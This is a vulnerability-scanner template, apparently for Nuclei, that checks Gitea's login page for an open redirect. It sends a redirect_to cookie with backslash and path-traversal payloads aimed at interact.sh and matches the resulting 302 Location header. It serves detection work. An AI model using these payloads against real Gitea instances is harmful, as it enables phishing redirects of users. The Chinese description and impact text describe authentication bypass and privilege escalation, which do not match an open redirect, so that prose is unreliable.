id: gitea-open-redirect-bypass

info:
  name: Gitea < 1.21.0 - 开放重定向漏洞
  author: ritikchaddha
  severity: medium
  description: |
    该模板用于检测 Gitea < 1.21.0 - 开放重定向漏洞。该类漏洞通常源于认证、授权或流程校验不足，使攻击者无需合法权限即可访问敏感功能。模板主要向 `/user/login` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可绕过身份认证或未授权访问敏感接口，获取管理功能、重置密码或操作业务数据。
    - 若接口涉及账号、配置或文件操作，可能造成权限提升、数据泄露和业务被篡改。
  remediation: |
    - 修复认证与授权校验逻辑，确保每个敏感接口都执行服务端权限判断。
    - 升级受影响版本，并限制管理接口仅允许可信来源访问。
    - 复核近期账号变更、密码重置、配置修改和异常访问记录。
  reference:
    - https://github.com/go-gitea/gitea/issues/36660
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
    epss-score: 0.07331
    epss-percentile: 0.91712
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: gitea
    product: gitea
    shodan-query:
      - title:"Gitea"
      - http.html:"powered by gitea version"
      - http.title:"gitea"
      - cpe:"cpe:2.3:a:gitea:gitea"
    fofa-query:
      - body="powered by gitea version"
      - title="gitea"
    google-query: intitle:"gitea"
  tags: redirect,gitea,bypass

http:
  - raw:
      - |
        GET /user/login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /user/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: redirect_to={{redirect}}

        _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    payloads:
      redirect:
        - /a/../\interact.sh
        - /a/../%5cinteract.sh

    matchers-condition: and
    matchers:
      - type: regex
        part: header_2
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$'

      - type: status
        status:
          - 302

    extractors:
      - type: regex
        name: csrf
        group: 1
        regex:
          - 'name="_csrf" value="(.*)"'
        internal: true
